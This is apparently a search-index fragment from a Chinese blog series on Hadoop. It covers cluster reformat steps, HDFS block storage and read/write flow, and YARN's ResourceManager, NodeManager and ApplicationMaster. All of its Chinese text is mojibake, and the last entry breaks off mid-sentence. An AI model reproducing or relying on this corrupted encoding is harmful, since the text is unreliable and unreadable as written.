","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:8","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"9. é‡æ–°æ ¼å¼åŒ–å’Œå¯åŠ¨ åœ¨æ¯ä¸ªèŠ‚ç‚¹è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š cd /opt/bigdata/hadoop sbin/stop-all.sh rm -rf logs/* rm -rf ../data/hadoop/* åœ¨namenodeèŠ‚ç‚¹(zy1)è¿è¡Œï¼š hdfs namenode -format ç„¶ååœ¨æ¯ä¸ªèŠ‚ç‚¹è¿è¡Œç›¸åº”å¯åŠ¨hadoopçš„å‘½ä»¤ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:9","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"å…­ã€é”™è¯¯æ’æŸ¥ å¦‚æœhadoopå¯åŠ¨å‡ºç°å‡ºé”™ï¼ŒæŸ¥çœ‹æ—¥å¿—ï¼Œæ—¥å¿—ä½äºhadoopå®‰è£…è·¯å¾„ä¸‹çš„logsç›®å½•ä¸‹ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:7:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"ä¸ƒã€å‚è€ƒæ–‡ç«  https://blog.csdn.net/hliq5399/article/details/78193113 https://www.cnblogs.com/zyly/p/11209286.html#_label4_16 https://blog.csdn.net/bqw18744018044/article/details/79103931 https://blog.csdn.net/henrrywan/article/details/86432912?depth_1-utm_source=distribute.pc_relevant.none-task\u0026utm_source=distribute.pc_relevant.none-task https://hadoop.apache.org/docs/ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:8:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-18","objectID":"/2019/10/hadoop5/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(äº”)â€“HDFS ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¶æ„ HDFSéµå¾ªä¸»ä»æ¶æ„ã€‚ Blockæ•°æ®å—; åŸºæœ¬å­˜å‚¨å•ä½ï¼Œä¸€èˆ¬å¤§å°ä¸º64Mï¼ˆé…ç½®å¤§çš„å—ä¸»è¦æ˜¯å› ä¸ºï¼š1ï¼‰å‡å°‘æœå¯»æ—¶é—´ï¼Œä¸€èˆ¬ç¡¬ç›˜ä¼ è¾“é€Ÿç‡æ¯”å¯»é“æ—¶é—´è¦å¿«ï¼Œå¤§çš„å—å¯ä»¥å‡å°‘å¯»é“æ—¶é—´ï¼›2ï¼‰å‡å°‘ç®¡ç†å—çš„æ•°æ®å¼€é”€ï¼Œæ¯ä¸ªå—éƒ½éœ€è¦åœ¨NameNodeä¸Šæœ‰å¯¹åº”çš„è®°å½•ï¼›3ï¼‰å¯¹æ•°æ®å—è¿›è¡Œè¯»å†™ï¼Œå‡å°‘å»ºç«‹ç½‘ç»œçš„è¿æ¥æˆæœ¬ï¼‰ ä¸€ä¸ªå¤§æ–‡ä»¶ä¼šè¢«æ‹†åˆ†æˆä¸€ä¸ªä¸ªçš„å—ï¼Œç„¶åå­˜å‚¨äºä¸åŒçš„æœºå™¨ã€‚å¦‚æœä¸€ä¸ªæ–‡ä»¶å°‘äºBlockå¤§å°ï¼Œé‚£ä¹ˆå®é™…å ç”¨çš„ç©ºé—´ä¸ºå…¶æ–‡ä»¶çš„å¤§å° åŸºæœ¬çš„è¯»å†™å•ä½ï¼Œç±»ä¼¼äºç£ç›˜çš„é¡µï¼Œæ¯æ¬¡éƒ½æ˜¯è¯»å†™ä¸€ä¸ªå— æ¯ä¸ªå—éƒ½ä¼šè¢«å¤åˆ¶åˆ°å¤šå°æœºå™¨ï¼Œé»˜è®¤å¤åˆ¶3ä»½ NameNode å­˜å‚¨æ–‡ä»¶çš„metadataï¼Œè¿è¡Œæ—¶æ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åˆ°å†…å­˜ï¼Œæ•´ä¸ªHDFSå¯å­˜å‚¨çš„æ–‡ä»¶æ•°å—é™äºNameNodeçš„å†…å­˜å¤§å° ä¸€ä¸ªBlockåœ¨NameNodeä¸­å¯¹åº”ä¸€æ¡è®°å½•ï¼ˆä¸€èˆ¬ä¸€ä¸ªblockå ç”¨150å­—èŠ‚ï¼‰ï¼Œå¦‚æœæ˜¯å¤§é‡çš„å°æ–‡ä»¶ï¼Œä¼šæ¶ˆè€—å¤§é‡å†…å­˜ã€‚åŒæ—¶map taskçš„æ•°é‡æ˜¯ç”±splitsæ¥å†³å®šçš„ï¼Œæ‰€ä»¥ç”¨MapReduceå¤„ç†å¤§é‡çš„å°æ–‡ä»¶æ—¶ï¼Œå°±ä¼šäº§ç”Ÿè¿‡å¤šçš„map taskï¼Œçº¿ç¨‹ç®¡ç†å¼€é”€å°†ä¼šå¢åŠ ä½œä¸šæ—¶é—´ã€‚å¤„ç†å¤§é‡å°æ–‡ä»¶çš„é€Ÿåº¦è¿œè¿œå°äºå¤„ç†åŒç­‰å¤§å°çš„å¤§æ–‡ä»¶çš„é€Ÿåº¦ã€‚å› æ­¤Hadoopå»ºè®®å­˜å‚¨å¤§æ–‡ä»¶ æ•°æ®ä¼šå®šæ—¶ä¿å­˜åˆ°æœ¬åœ°ç£ç›˜ï¼Œä½†ä¸ä¿å­˜blockçš„ä½ç½®ä¿¡æ¯ï¼Œè€Œæ˜¯ç”±DataNodeæ³¨å†Œæ—¶ä¸ŠæŠ¥å’Œè¿è¡Œæ—¶ç»´æŠ¤ï¼ˆNameNodeä¸­ä¸DataNodeç›¸å…³çš„ä¿¡æ¯å¹¶ä¸ä¿å­˜åˆ°NameNodeçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè€Œæ˜¯NameNodeæ¯æ¬¡é‡å¯åï¼ŒåŠ¨æ€é‡å»ºï¼‰ NameNodeå¤±æ•ˆåˆ™æ•´ä¸ªHDFSéƒ½å¤±æ•ˆäº†ï¼Œæ‰€ä»¥è¦ä¿è¯NameNodeçš„å¯ç”¨æ€§ Secondary NameNode å®šæ—¶ä¸NameNodeè¿›è¡ŒåŒæ­¥ï¼ˆå®šæœŸåˆå¹¶æ–‡ä»¶ç³»ç»Ÿé•œåƒå’Œç¼–è¾‘æ—¥å¿—ï¼Œç„¶åæŠŠåˆå¹¶åçš„ä¼ ç»™NameNodeï¼Œæ›¿æ¢å…¶é•œåƒï¼Œå¹¶æ¸…ç©ºç¼–è¾‘æ—¥å¿—ï¼Œç±»ä¼¼äºCheckPointæœºåˆ¶ï¼‰ï¼Œä½†NameNodeå¤±æ•ˆåä»éœ€è¦æ‰‹å·¥å°†å…¶è®¾ç½®æˆä¸»æœº DataNode ä¿å­˜å…·ä½“çš„blockæ•°æ® è´Ÿè´£æ•°æ®çš„è¯»å†™æ“ä½œå’Œå¤åˆ¶æ“ä½œ DataNodeå¯åŠ¨æ—¶ä¼šå‘NameNodeæŠ¥å‘Šå½“å‰å­˜å‚¨çš„æ•°æ®å—ä¿¡æ¯ï¼Œåç»­ä¹Ÿä¼šå®šæ—¶æŠ¥å‘Šä¿®æ”¹ä¿¡æ¯ DataNodeä¹‹é—´ä¼šè¿›è¡Œé€šä¿¡ï¼Œå¤åˆ¶æ•°æ®å—ï¼Œä¿è¯æ•°æ®çš„å†—ä½™æ€§ ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"äºŒã€å†™æ–‡ä»¶ 1.å®¢æˆ·ç«¯å°†æ–‡ä»¶å†™å…¥æœ¬åœ°ç£ç›˜çš„HDFS Clientæ–‡ä»¶ä¸­ 2.å½“ä¸´æ—¶æ–‡ä»¶å¤§å°è¾¾åˆ°ä¸€ä¸ªblockå¤§å°æ—¶ï¼ŒHDFS clienté€šçŸ¥NameNodeï¼Œç”³è¯·å†™å…¥æ–‡ä»¶ 3.NameNodeåœ¨HDFSçš„æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶æŠŠè¯¥block idå’Œè¦å†™å…¥çš„DataNodeçš„åˆ—è¡¨è¿”å›ç»™å®¢æˆ·ç«¯ 4.å®¢æˆ·ç«¯æ”¶åˆ°è¿™äº›ä¿¡æ¯åï¼Œå°†ä¸´æ—¶æ–‡ä»¶å†™å…¥DataNodes 4.1 å®¢æˆ·ç«¯å°†æ–‡ä»¶å†…å®¹å†™å…¥ç¬¬ä¸€ä¸ªDataNodeï¼ˆä¸€èˆ¬ä»¥4kbä¸ºå•ä½è¿›è¡Œä¼ è¾“ï¼‰ 4.2 ç¬¬ä¸€ä¸ªDataNodeæ¥æ”¶åï¼Œå°†æ•°æ®å†™å…¥æœ¬åœ°ç£ç›˜ï¼ŒåŒæ—¶ä¹Ÿä¼ è¾“ç»™ç¬¬äºŒä¸ªDataNode 4.3 ä¾æ­¤ç±»æ¨åˆ°æœ€åä¸€ä¸ªDataNodeï¼Œæ•°æ®åœ¨DataNodeä¹‹é—´æ˜¯é€šè¿‡pipelineçš„æ–¹å¼è¿›è¡Œå¤åˆ¶çš„ 4.4 åé¢çš„DataNodeæ¥æ”¶å®Œæ•°æ®åï¼Œéƒ½ä¼šå‘é€ä¸€ä¸ªç¡®è®¤ç»™å‰ä¸€ä¸ªDataNodeï¼Œæœ€ç»ˆç¬¬ä¸€ä¸ªDataNodeè¿”å›ç¡®è®¤ç»™å®¢æˆ·ç«¯ 4.5 å½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°æ•´ä¸ªblockçš„ç¡®è®¤åï¼Œä¼šå‘NameNodeå‘é€ä¸€ä¸ªæœ€ç»ˆçš„ç¡®è®¤ä¿¡æ¯ 4.6 å¦‚æœå†™å…¥æŸä¸ªDataNodeå¤±è´¥ï¼Œæ•°æ®ä¼šç»§ç»­å†™å…¥å…¶ä»–çš„DataNodeã€‚ç„¶åNameNodeä¼šæ‰¾å¦å¤–ä¸€ä¸ªå¥½çš„DataNodeç»§ç»­å¤åˆ¶ï¼Œä»¥ä¿è¯å†—ä½™æ€§ 4.7 æ¯ä¸ªblockéƒ½ä¼šæœ‰ä¸€ä¸ªæ ¡éªŒç ï¼Œå¹¶å­˜æ”¾åˆ°ç‹¬ç«‹çš„æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿è¯»çš„æ—¶å€™æ¥éªŒè¯å…¶å®Œæ•´æ€§ 5.æ–‡ä»¶å†™å®Œåï¼ˆå®¢æˆ·ç«¯å…³é—­ï¼‰ï¼ŒNameNodeæäº¤æ–‡ä»¶ï¼ˆè¿™æ—¶æ–‡ä»¶æ‰å¯è§ï¼Œå¦‚æœæäº¤å‰ï¼ŒNameNodeå®æ‰ï¼Œé‚£æ–‡ä»¶ä¹Ÿå°±ä¸¢å¤±äº†ã€‚fsyncï¼šåªä¿è¯æ•°æ®çš„ä¿¡æ¯å†™åˆ°NameNodeä¸Šï¼Œä½†å¹¶ä¸ä¿è¯æ•°æ®å·²ç»è¢«å†™åˆ°DataNodeä¸­ï¼‰ Rack awareï¼ˆæœºæ¶æ„ŸçŸ¥ï¼‰ é€šè¿‡é…ç½®æ–‡ä»¶æŒ‡å®šæœºæ¶åå’ŒDNSçš„å¯¹åº”å…³ç³» å‡è®¾å¤åˆ¶å‚æ•°æ˜¯3ï¼Œåœ¨å†™å…¥æ–‡ä»¶æ—¶ï¼Œä¼šåœ¨æœ¬åœ°çš„æœºæ¶ä¿å­˜ä¸€ä»½æ•°æ®ï¼Œç„¶ååœ¨å¦å¤–ä¸€ä¸ªæœºæ¶å†…ä¿å­˜ä¸¤ä»½æ•°æ®ï¼ˆåŒæœºæ¶å†…çš„ä¼ è¾“é€Ÿåº¦å¿«ï¼Œä»è€Œæé«˜æ€§èƒ½ï¼‰ æ•´ä¸ªHDFSçš„é›†ç¾¤ï¼Œæœ€å¥½æ˜¯è´Ÿè½½å¹³è¡¡çš„ï¼Œè¿™æ ·æ‰èƒ½å°½é‡åˆ©ç”¨é›†ç¾¤çš„ä¼˜åŠ¿ã€‚ ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"ä¸‰ã€è¯»æ–‡ä»¶ å®¢æˆ·ç«¯å‘NameNodeå‘é€è¯»å–è¯·æ±‚ NameNodeè¿”å›æ–‡ä»¶çš„æ‰€æœ‰blockå’Œè¿™äº›blockæ‰€åœ¨çš„DataNodesï¼ˆåŒ…æ‹¬å¤åˆ¶èŠ‚ç‚¹ï¼‰ å®¢æˆ·ç«¯ç›´æ¥ä»DataNodeä¸­è¯»å–æ•°æ®ï¼Œå¦‚æœè¯¥DataNodeè¯»å–å¤±è´¥ï¼ˆDataNodeå¤±æ•ˆæˆ–æ ¡éªŒç ä¸å¯¹ï¼‰ï¼Œåˆ™ä»å¤åˆ¶èŠ‚ç‚¹ä¸­è¯»å–ï¼ˆå¦‚æœè¯»å–çš„æ•°æ®å°±åœ¨æœ¬æœºï¼Œåˆ™ç›´æ¥è¯»å–ï¼Œå¦åˆ™é€šè¿‡ç½‘ç»œè¯»å–ï¼‰ ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:3:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"å››ã€å¯é æ€§ DataNodeå¯ä»¥å¤±æ•ˆ DataNodeä¼šå®šæ—¶å‘é€å¿ƒè·³åˆ°NameNodeã€‚å¦‚æœä¸€æ®µæ—¶é—´å†…NameNodeæ²¡æœ‰æ”¶åˆ°DataNodeçš„å¿ƒè·³æ¶ˆæ¯ï¼Œåˆ™è®¤ä¸ºå…¶å¤±æ•ˆã€‚æ­¤æ—¶NameNodeå°±ä¼šå°†è¯¥èŠ‚ç‚¹çš„æ•°æ®ï¼ˆä»è¯¥èŠ‚ç‚¹çš„å¤åˆ¶èŠ‚ç‚¹ä¸­è·å–ï¼‰å¤åˆ¶åˆ°å¦å¤–çš„DataNodeä¸­ æ•°æ®å¯ä»¥æ¯å æ— è®ºæ˜¯å†™å…¥æ—¶è¿˜æ˜¯ç¡¬ç›˜æœ¬èº«çš„é—®é¢˜ï¼Œåªè¦æ•°æ®æœ‰é—®é¢˜ï¼ˆè¯»å–æ—¶é€šè¿‡æ ¡éªŒç æ¥æ£€æµ‹ï¼‰ï¼Œéƒ½å¯ä»¥é€šè¿‡å…¶ä»–çš„å¤åˆ¶èŠ‚ç‚¹è¯»å–ï¼ŒåŒæ—¶è¿˜ä¼šå†å¤åˆ¶ä¸€ä»½åˆ°å¥åº·çš„èŠ‚ç‚¹ä¸­ NameNodeä¸å¯é  ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:4:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"äº”ã€å‘½ä»¤å·¥å…· fsck: æ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ start-balancer.sh: é‡æ–°å¹³è¡¡HDFS hdfs dfs -copyFromLocal ä»æœ¬åœ°ç£ç›˜å¤åˆ¶æ–‡ä»¶åˆ°HDFS ","date":"2019-10-18","objectID":"/2019/10/hadoop5/:5:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äº”)--HDFS","uri":"/2019/10/hadoop5/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-17","objectID":"/2019/10/hadoop4/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(å››)â€“YARN ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¶æ„ YARNçš„æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š YARNå°†èµ„æºç®¡ç†å’Œä»»åŠ¡è°ƒåº¦ç›‘æ§æ‹†åˆ†æˆäº†ç‹¬ç«‹çš„è¿›ç¨‹ï¼šä¸€ä¸ªå…¨å±€çš„èµ„æºç®¡ç†å’Œä¸€ä¸ªæ¯ä¸ªä½œä¸šçš„ç®¡ç†ï¼ˆApplicationMasterï¼‰ã€‚ ResourceManagerå’ŒNodeManageræä¾›äº†è®¡ç®—èµ„æºçš„åˆ†é…å’Œç®¡ç†ï¼Œè€ŒApplicationMasteråˆ™å®Œæˆåº”ç”¨ç¨‹åºçš„è¿è¡Œã€‚ ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"1. ResourceManager è´Ÿè´£å…¨å±€çš„èµ„æºç®¡ç†å’Œä»»åŠ¡è°ƒåº¦ï¼ŒæŠŠæ•´ä¸ªé›†ç¾¤å½“æˆè®¡ç®—èµ„æºæ± ï¼Œåªå…³æ³¨åˆ†é…ï¼Œä¸ç®¡åº”ç”¨ï¼Œä¸”ä¸è´Ÿè´£å®¹é”™ã€‚ èµ„æºç®¡ç† ä»¥å‰èµ„æºæ˜¯æ¯ä¸ªèŠ‚ç‚¹åˆ†æˆä¸€ä¸ªä¸ªçš„Map slotå’ŒReduce slotï¼Œç°åœ¨æ˜¯ä¸€ä¸ªä¸ªContainerï¼Œæ¯ä¸ªContainerå¯ä»¥æ ¹æ®éœ€è¦è¿è¡ŒApplicationMasterã€Mapã€Reduceæˆ–è€…ä»»æ„çš„ç¨‹åº ä»¥å‰çš„èµ„æºåˆ†é…æ˜¯é™æ€çš„ï¼Œç›®å‰æ˜¯åŠ¨æ€çš„ï¼Œèµ„æºåˆ©ç”¨ç‡æ›´é«˜ Containeræ˜¯èµ„æºç”³è¯·çš„å•ä½ï¼Œä¸€ä¸ªèµ„æºç”³è¯·æ ¼å¼ï¼š\u003cresource-name, priority, resource-requirement, number-of-containers\u003e, resource-nameï¼šä¸»æœºåã€æœºæ¶åæˆ–*ï¼ˆä»£è¡¨ä»»æ„æœºå™¨ï¼‰, resource-requirementï¼šç›®å‰åªæ”¯æŒCPUå’Œå†…å­˜ ç”¨æˆ·æäº¤ä½œä¸šåˆ°ResourceManagerï¼Œç„¶ååœ¨æŸä¸ªNodeManagerä¸Šåˆ†é…ä¸€ä¸ªContaineræ¥è¿è¡ŒApplicationMasterï¼ŒApplicationMasterå†æ ¹æ®è‡ªèº«ç¨‹åºéœ€è¦å‘ResourceManagerç”³è¯·èµ„æº YARNæœ‰ä¸€å¥—Containerçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†æœºåˆ¶ï¼Œè€ŒApplicationMasterå’Œå…¶Containerä¹‹é—´çš„ç®¡ç†æ˜¯åº”ç”¨ç¨‹åºè‡ªå·±å®šä¹‰çš„ ä»»åŠ¡è°ƒåº¦ åªå…³æ³¨èµ„æºçš„ä½¿ç”¨æƒ…å†µï¼Œæ ¹æ®éœ€æ±‚åˆç†åˆ†é…èµ„æº Scheluerå¯ä»¥æ ¹æ®ç”³è¯·çš„éœ€è¦ï¼Œåœ¨ç‰¹å®šçš„æœºå™¨ä¸Šç”³è¯·ç‰¹å®šçš„èµ„æºï¼ˆApplicationMasterè´Ÿè´£ç”³è¯·èµ„æºæ—¶çš„æ•°æ®æœ¬åœ°åŒ–çš„è€ƒè™‘ï¼ŒResourceManagerå°†å°½é‡æ»¡è¶³å…¶ç”³è¯·éœ€æ±‚ï¼Œåœ¨æŒ‡å®šçš„æœºå™¨ä¸Šåˆ†é…Containerï¼Œä»è€Œå‡å°‘æ•°æ®ç§»åŠ¨ï¼‰ å†…éƒ¨ç»“æ„ Client Service: åº”ç”¨æäº¤ã€ç»ˆæ­¢ã€è¾“å‡ºä¿¡æ¯ï¼ˆåº”ç”¨ã€é˜Ÿåˆ—ã€é›†ç¾¤ç­‰çš„çŠ¶æ€ä¿¡æ¯ï¼‰ Adaminstration Service: é˜Ÿåˆ—ã€èŠ‚ç‚¹ã€Clientæƒé™ç®¡ç† ApplicationMasterService: æ³¨å†Œã€ç»ˆæ­¢ApplicationMaster, è·å–ApplicationMasterçš„èµ„æºç”³è¯·æˆ–å–æ¶ˆçš„è¯·æ±‚ï¼Œå¹¶å°†å…¶å¼‚æ­¥åœ°ä¼ ç»™Scheduler, å•çº¿ç¨‹å¤„ç† ApplicationMaster Liveliness Monitor: æ¥æ”¶ApplicationMasterçš„å¿ƒè·³æ¶ˆæ¯ï¼Œå¦‚æœæŸä¸ªApplicationMasteråœ¨ä¸€å®šæ—¶é—´å†…æ²¡æœ‰å‘é€å¿ƒè·³ï¼Œåˆ™è¢«ä»»åŠ¡å¤±æ•ˆï¼Œå…¶èµ„æºå°†ä¼šè¢«å›æ”¶ï¼Œç„¶åResourceManagerä¼šé‡æ–°åˆ†é…ä¸€ä¸ªApplicationMasterè¿è¡Œè¯¥åº”ç”¨ï¼ˆé»˜è®¤å°è¯•2æ¬¡ï¼‰ Resource Tracker Service: æ³¨å†ŒèŠ‚ç‚¹, æ¥æ”¶å„æ³¨å†ŒèŠ‚ç‚¹çš„å¿ƒè·³æ¶ˆæ¯ NodeManagers Liveliness Monitor: ç›‘æ§æ¯ä¸ªèŠ‚ç‚¹çš„å¿ƒè·³æ¶ˆæ¯ï¼Œå¦‚æœé•¿æ—¶é—´æ²¡æœ‰æ”¶åˆ°å¿ƒè·³æ¶ˆæ¯ï¼Œåˆ™è®¤ä¸ºè¯¥èŠ‚ç‚¹æ— æ•ˆ, åŒæ—¶æ‰€æœ‰åœ¨è¯¥èŠ‚ç‚¹ä¸Šçš„Containeréƒ½æ ‡è®°æˆæ— æ•ˆï¼Œä¹Ÿä¸ä¼šè°ƒåº¦ä»»åŠ¡åˆ°è¯¥èŠ‚ç‚¹è¿è¡Œ ApplicationManager: ç®¡ç†åº”ç”¨ç¨‹åºï¼Œè®°å½•å’Œç®¡ç†å·²å®Œæˆçš„åº”ç”¨ ApplicationMaster Launcher: ä¸€ä¸ªåº”ç”¨æäº¤åï¼Œè´Ÿè´£ä¸NodeManageräº¤äº’ï¼Œåˆ†é…Containerå¹¶åŠ è½½ApplicationMasterï¼Œä¹Ÿè´Ÿè´£ç»ˆæ­¢æˆ–é”€æ¯ YarnScheduler: èµ„æºè°ƒåº¦åˆ†é…ï¼Œ æœ‰FIFO(with Priority)ï¼ŒFairï¼ŒCapacityæ–¹å¼ ContainerAllocationExpirer: ç®¡ç†å·²åˆ†é…ä½†æ²¡æœ‰å¯ç”¨çš„Containerï¼Œè¶…è¿‡ä¸€å®šæ—¶é—´åˆ™å°†å…¶å›æ”¶ ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"2. NodeManager NodeèŠ‚ç‚¹ä¸‹çš„Containerç®¡ç† å¯åŠ¨æ—¶å‘ResourceManageræ³¨å†Œå¹¶å®šæ—¶å‘é€å¿ƒè·³æ¶ˆæ¯ï¼Œç­‰å¾…ResourceManagerçš„æŒ‡ä»¤ ç›‘æ§Containerçš„è¿è¡Œï¼Œç»´æŠ¤Containerçš„ç”Ÿå‘½å‘¨æœŸï¼Œç›‘æ§Containerçš„èµ„æºä½¿ç”¨æƒ…å†µ å¯åŠ¨æˆ–åœæ­¢Containerï¼Œç®¡ç†ä»»åŠ¡è¿è¡Œæ—¶çš„ä¾èµ–åŒ…ï¼ˆæ ¹æ®ApplicationMasterçš„éœ€è¦ï¼Œå¯åŠ¨Containerä¹‹å‰å°†éœ€è¦çš„ç¨‹åºåŠå…¶ä¾èµ–åŒ…ã€é…ç½®æ–‡ä»¶ç­‰æ‹·è´åˆ°æœ¬åœ°ï¼‰ å†…éƒ¨ç»“æ„ NodeStatusUpdater: å¯åŠ¨å‘ResourceManageræ³¨å†Œï¼ŒæŠ¥å‘Šè¯¥èŠ‚ç‚¹çš„å¯ç”¨èµ„æºæƒ…å†µï¼Œé€šä¿¡çš„ç«¯å£å’Œåç»­çŠ¶æ€çš„ç»´æŠ¤ ContainerManager: æ¥æ”¶RPCè¯·æ±‚ï¼ˆå¯åŠ¨ã€åœæ­¢ï¼‰ï¼Œèµ„æºæœ¬åœ°åŒ–ï¼ˆä¸‹è½½åº”ç”¨éœ€è¦çš„èµ„æºåˆ°æœ¬åœ°ï¼Œæ ¹æ®éœ€è¦å…±äº«è¿™äº›èµ„æºï¼‰ PUBLIC: /filecache PRIVATE: /usercache//filecache APPLICATION: /usercache//appcache//ï¼ˆåœ¨ç¨‹åºå®Œæˆåä¼šè¢«åˆ é™¤ï¼‰ ContainersLauncher: åŠ è½½æˆ–ç»ˆæ­¢Container ContainerMonitor: ç›‘æ§Containerçš„è¿è¡Œå’Œèµ„æºä½¿ç”¨æƒ…å†µ ContainerExecutor: å’Œåº•å±‚æ“ä½œç³»ç»Ÿäº¤äº’ï¼ŒåŠ è½½è¦è¿è¡Œçš„ç¨‹åº ","date":"2019-10-17","objectID":"/2019/10/hadoop4/:1:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å››)--YARN","uri":"/2019/10/hadoop4/"},{"categories":["Vuln"],"content":"3. ApplicationMaster å•ä¸ªä½œä¸šçš„èµ„æºç®¡ç†å’Œä»»åŠ¡ç›‘æ§ å…·ä½“åŠŸèƒ½æè¿°ï¼š è®¡ç®—åº”ç”¨çš„èµ„æºéœ€æ±‚ï¼Œèµ„æºå¯ä»¥æ˜¯é™æ€æˆ–åŠ¨æ€è®¡ç®—çš„ï¼Œé™æ€çš„ä¸€èˆ¬æ˜¯Clientç”³è¯·æ—¶å°±æŒ‡å®šäº†ï¼ŒåŠ¨æ€åˆ™éœ€è¦ApplicationMasteræ ¹æ®åº”ç”¨çš„è¿è¡ŒçŠ¶æ€æ¥å†³å®š æ ¹æ®æ•°æ®æ¥ç”³è¯·å¯¹åº”ä½ç½®çš„èµ„æºï¼ˆData Localityï¼‰ å‘ResourceManagerç”³è¯·èµ„æºï¼Œä¸NodeManageräº¤äº’è¿›è¡Œç¨‹åºçš„è¿è¡Œå’Œç›‘æ§ï¼Œç›‘æ§ç”³è¯·çš„èµ„æºçš„ä½¿ç”¨æƒ…å†µï¼Œç›‘æ§ä½œä¸šè¿›åº¦ è·Ÿè¸ªä»»åŠ¡çŠ¶æ€å’Œè¿›åº¦ï¼Œå®šæ—¶å‘ResourceManagerå‘é€å¿ƒè·³æ¶ˆæ¯ï¼ŒæŠ¥å‘Šèµ„æºçš„ä½¿ç”¨æƒ…å†µå’Œåº”ç”¨çš„è¿›åº¦ä¿¡æ¯ è´Ÿè´£æœ¬ä½œä¸šå†…çš„ä»»åŠ¡çš„å®¹é”™ ApplicationMasterå¯ä»¥æ˜¯ç”¨ä»»ä½•è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒå’ŒResourceManagerå’ŒNodeManagerä¹‹é—´æ˜¯é€šè¿‡ProtocolBufäº¤äº’ï¼Œä»¥å‰æ˜¯ä¸€ä¸ªå…¨å±€çš„JobTrackerè´Ÿè´£çš„ï¼Œç°åœ¨æ¯ä¸ªä½œä¸šéƒ½ä¸€ä¸ªï¼Œå¯ä¼¸ç¼©æ€§æ›´å¼ºï¼Œè‡³å°‘ä¸ä¼šå› ä¸ºä½œä¸šå¤ªå¤šï¼Œé€ æˆJobTrackerç“¶é¢ˆã€‚åŒæ—¶å°†ä½œä¸šçš„é€»è¾‘æ”¾åˆ°ä¸€ä¸ªç‹¬ç«‹çš„ApplicationMasterä¸­ï¼Œä½¿å¾—çµæ´»æ€§æ›´åŠ é«˜ï¼Œæ¯ä¸ªä½œä¸šéƒ½å¯ä»¥æœ‰è‡ªå·±çš„å¤„ç†æ–¹å¼ï¼Œä¸ç”¨ç»‘å®šåˆ°MapReduceçš„å¤„ç†æ¨¡å¼ä¸Š å¦‚ä½•è®¡ç®—èµ„æºéœ€æ±‚ ä¸€èˆ¬çš„MapReduceæ˜¯æ 